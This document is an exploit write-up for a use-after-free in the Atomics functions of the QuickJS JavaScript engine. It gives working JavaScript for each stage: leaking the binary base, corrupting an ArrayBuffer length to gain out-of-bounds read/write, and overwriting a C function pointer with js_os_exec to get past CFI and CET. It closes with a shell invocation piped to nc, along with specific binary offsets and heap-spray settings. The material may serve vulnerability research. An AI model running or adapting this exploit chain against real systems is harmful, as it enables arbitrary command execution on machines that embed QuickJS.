# QuickJS Atomics CVE Exploitation Analysis - CFI/CET Bypass

## Vulnerability Summary

The vulnerability exists in QuickJS's `js_atomics_op()` and `js_atomics_store()` functions. When processing Atomics operations on resizable ArrayBuffers, the code reads the buffer's data pointer before calling `valueOf()` on the operands. If `valueOf()` triggers a resize operation, the previously-read pointer becomes stale, leading to a use-after-free or out-of-bounds access.

## Exploitation Strategy

### Stage 1: Binary Address Leak via UAF Read

The exploit creates a 56-byte resizable ArrayBuffer and triggers a UAF read via `Atomics.compareExchange()`. The stale pointer allows reading fields from a JSArrayBuffer structure that was allocated in the same memory location:

```javascript
function uafRead(fieldIndex, numVictims) {
    let trigger_ab = new ArrayBuffer(56, { maxByteLength: 4096 });
    let trigger_view = new BigInt64Array(trigger_ab);
    // ... fill with sentinel

    let malicious = {
        valueOf: function() {
            trigger_ab.resize(4096);  // Triggers reallocation
            // Spray with victim ArrayBuffers
            for (let i = 0; i < numVictims; i++) {
                victims.push(new ArrayBuffer(0x100));
            }
            return 0xDEADDEADDEADDEADn;
        }
    };

    // This reads through stale pointer, getting victim's free_func
    return Atomics.compareExchange(trigger_view, fieldIndex, malicious, dummy);
}
```

Field index 6 (offset 48) contains the `free_func` pointer, which points to `js_array_buffer_free` at binary offset `0x109d40`. This leaks the binary base address.

### Stage 2: OOB Write Primitive via byteLength Corruption

A second UAF primitive corrupts a victim ArrayBuffer's `byte_length` field using `Atomics.store()` with an Int32Array view:

```javascript
function createOOB(numVictims) {
    let trigger_ab = new ArrayBuffer(56, { maxByteLength: 4096 });
    let trigger_view = new Int32Array(trigger_ab);

    let malicious = {
        valueOf: function() {
            trigger_ab.resize(4096);
            // Spray victims
            for (let i = 0; i < numVictims; i++) {
                victims.push(new ArrayBuffer(0x100));
            }
            return 0x7FFFFFFF;  // Large byteLength value
        }
    };

    Atomics.store(trigger_view, 0, malicious);
    // One victim will have corrupted byteLength
}
```

This gives a victim ArrayBuffer with `byteLength = 0x7FFFFFFF`, providing massive OOB read/write capability.

### Stage 3: CFI Bypass via C Function Pointer Corruption

The key insight for bypassing CFI is that all JSCFunction types share compatible function signatures:

```c
typedef JSValue (*JSCFunction)(JSContext *ctx, JSValueConst this_val,
                               int argc, JSValueConst *argv);
```

The exploit scans the heap for JSObject structures with `class_id == 12` (JS_CLASS_C_FUNCTION) and locates the `c_function` pointer at offset 56. By replacing this pointer with the address of `js_os_exec` (binary offset `0x10b900`), calling the original function now invokes `js_os_exec` instead.

```javascript
// Scan for C function objects
for (let off = 0; off < 0x20000; off += 8) {
    let header = safeReadU64(dv, off);
    let class_id = Number((header >> 48n) & 0xFFFFn);
    if (class_id === JS_CLASS_C_FUNCTION) {
        let cfunc = safeReadU64(dv, off + 56);
        if (cfunc >= binary_base && cfunc < binary_base + 0x150000n) {
            // Corrupt to js_os_exec
            dv.setBigUint64(off + 56, js_os_exec_addr, true);
            dv.setUint8(off + 64, 1);  // length = 1
            dv.setUint8(off + 65, 0);  // cproto = JS_CFUNC_generic
            break;
        }
    }
}
```

### Stage 4: Shell Execution

The corrupted C function is typically `js_number_toString` (offset `0x10a9a0`). Calling `(123).toString(...)` now invokes `js_os_exec` with our controlled arguments:

```javascript
(123).toString(["/bin/sh", "-c", "sh"]);
```

The inner shell reads from stdin and executes the piped command (`nc 127.0.0.1 9999`).

## Why CFI Doesn't Block This

LLVM's CFI uses type-based checks. All JSCFunction implementations have the same function signature, so the CFI check passes when we redirect `js_number_toString` to `js_os_exec` - both are valid targets for the `JSCFunction` type.

## Why CET Doesn't Block This

Intel CET's shadow stack protects return addresses from ROP attacks. However, this exploit doesn't modify return addresses or use ROP chains. Instead, it performs a legitimate indirect call through an existing code path, just with a corrupted function pointer. The shadow stack remains valid throughout the attack.

## Key Offsets (CFI Binary)

| Symbol | Offset |
|--------|--------|
| `js_array_buffer_free` | `0x109d40` |
| `js_os_exec` | `0x10b900` |
| `js_number_toString` | `0x10a9a0` |

## Heap Layout Considerations

The exploit is sensitive to heap layout, which is affected by string literals and other allocations in the JavaScript source. The exploit uses a specific spray size (300 victims) and relies on C function objects being located within the OOB range (~0x19000-0x1a000 from the corrupted ArrayBuffer).
